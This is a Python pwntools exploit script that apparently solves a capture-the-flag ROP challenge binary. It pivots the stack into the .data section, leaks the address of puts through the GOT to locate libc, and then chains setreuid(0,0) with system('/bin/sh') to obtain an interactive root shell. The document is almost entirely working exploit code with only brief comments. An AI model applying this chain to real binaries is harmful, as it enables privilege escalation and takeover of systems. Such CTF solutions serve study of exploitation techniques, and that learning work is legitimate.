### idea: ret2plt, stack pivoting by pop rbp -> leave ret

from pwn import *

context.arch = 'amd64'

elf = ELF('/challenge/babyrop_level9.1')
pivot_rop = ROP(elf)
leak_rop = ROP(elf)

pop_rdi = pivot_rop.rdi.address
pop_rbp = pivot_rop.rbp.address
tmp_rbp = 0x414080 + 0x18 # for pivoting to .data. + 0x18 is the position after the leave ret gadgets
new_rbp = 0x414080 + 0x1000 # after pivoting to .data, use leave ret to adjust the stack frame. the whole buffer
leave_ret = 0x4012cc 
ret = pivot_rop.ret.address # stack alignment

puts_plt = elf.plt.puts
puts_got = elf.got.puts
start = elf.sym['_start']

p = process(["/challenge/babyrop_level9.1"])
#padding = b"A" * (0x60 + 8) # no padding in this chall

# stack pivoting
pivot_rop.raw(pop_rbp)
pivot_rop.raw(tmp_rbp)
pivot_rop.raw(leave_ret)
pivot_rop.raw(new_rbp) # now the rsp is below this addr

# leak puts@got addr
leak_rop.raw(pop_rdi)
leak_rop.raw(puts_got)
leak_rop.raw(puts_plt)
leak_rop.raw(start)

#payload = padding + rop.chain() # no padding in this chall
payload = pivot_rop.chain() + leak_rop.chain()

p.send(payload)

p.recvuntil(b"Leaving!\n")
puts_addr = unpack(p.recvuntil(b"\n")[:-1], 'all')

# get libc base addr
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc.address = puts_addr - libc.symbols['puts']

# system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
libc_rop = ROP(libc)
libc_rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
libc_rop.raw(ret)
libc_rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])

payload = pivot_rop.chain() + libc_rop.chain()

p.send(payload)

p.interactive()

